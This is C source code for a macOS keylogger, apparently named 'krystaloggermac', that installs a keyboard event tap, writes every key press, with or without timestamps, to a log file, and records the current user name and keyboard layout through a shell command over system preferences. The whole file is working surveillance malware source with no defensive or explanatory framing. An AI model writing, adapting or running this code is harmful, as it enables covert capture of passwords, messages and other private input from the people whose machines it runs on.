#include "logger.h";
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>


/* put the log path here */
#define PATH "/Users/prg/Desktop/krystaloggermac.log"

FILE *f;

CGEventRef keyboardCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if ((type != kCGEventKeyDown) && (type != kCGEventKeyUp) && (type != kCGEventFlagsChanged)) {
        return event;
    }
    CGKeyCode keycode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    if (autorun) {
        fprintf(f, "%s", keycodeToString(keycode));
    } else {
        time_t timer;
        char buffer[26];
        struct tm* tm_info;
        time(&timer);
        tm_info = localtime(&timer);

        strftime(buffer, 26, "%m-%d-%Y %H:%M:%S", tm_info);

        fprintf(f, "%s %s \n", buffer ,keycodeToString(keycode));
    }

    fflush(f);
    return event;
}

int main(int argc, char const *argv[]) {
    f = fopen(PATH, "a+");

    if (f == NULL) {
        exit(EXIT_FAILURE);
    }

    layout_switch = true;
    autorun = true;

    char user[50];
    if (getlogin_r(user, 50)) {
        printf("Error: Couldnt get username \n");
    }

    char cmd[] = "defaults read /Users/*/Library/Preferences/com.apple.HIToolbox.plist AppleSelectedInputSources | egrep -w 'KeyboardLayout Name' | sed -E 's/^.+ = \"?([^\"]+)\"?;$/\\1/' | tr -d '\n'";

    FILE *fp = popen(cmd, "r");
    if (fp == NULL) {
        exit(EXIT_FAILURE);
    }

    fgets(layout, sizeof(layout), fp);
    pclose(fp);

    fprintf(f, "\n\t\tUser: %s\t\t\n", user);
    fprintf(f, "\t\tLayout: %s\t\t\n\n", layout);

     CGEventMask eventMask = ((1 << kCGEventKeyDown) | (1 << kCGEventFlagsChanged));

    CFMachPortRef eventTap = CGEventTapCreate((CGEventTapLocation)kCGSessionEventTap, (CGEventTapPlacement)kCGHeadInsertEventTap, (CGEventTapOptions)0, eventMask, keyboardCallback, NULL);

    if (!eventTap) {
        exit(EXIT_FAILURE);
    }

    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    CFRunLoopRun();

    return 0;


}